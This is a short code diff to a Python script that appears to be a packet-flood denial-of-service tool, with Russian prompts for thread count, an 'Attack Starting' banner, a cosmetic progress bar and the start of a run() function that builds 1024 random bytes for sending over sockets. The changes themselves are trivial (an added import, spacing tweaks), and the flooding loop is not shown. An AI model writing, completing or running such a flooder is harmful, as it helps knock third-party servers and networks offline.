@@ -4,6 +4,7 @@ import random
 import time
 import socket
 import threading
+import sys
 import os
 # Colors
 yellow='\033[92m'
@@ -31,17 +32,16 @@ threads = int(input(" Потоки (~800 лучше) ════> "))
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print ("[                    ] 0% ")
+print ("[                   ] 0% ")
 time.sleep(3)
-print ("[=====               ] 25%")
+print ("[=====              ] 25%")
 time.sleep(3)
-print ("[==========          ] 50%")
+print ("[==========         ] 50%")
 time.sleep(3)
-print ("[===============     ] 75%")
+print ("[===============    ] 75%")
 time.sleep(3)
-print ("[====================] 100%")
+print ("[===================] 100%")
 time.sleep(2)
-os.system("clear")
 def run():
   data = random._urandom(1024)
   i = random.choice(("[*]","[!]","[#]"))
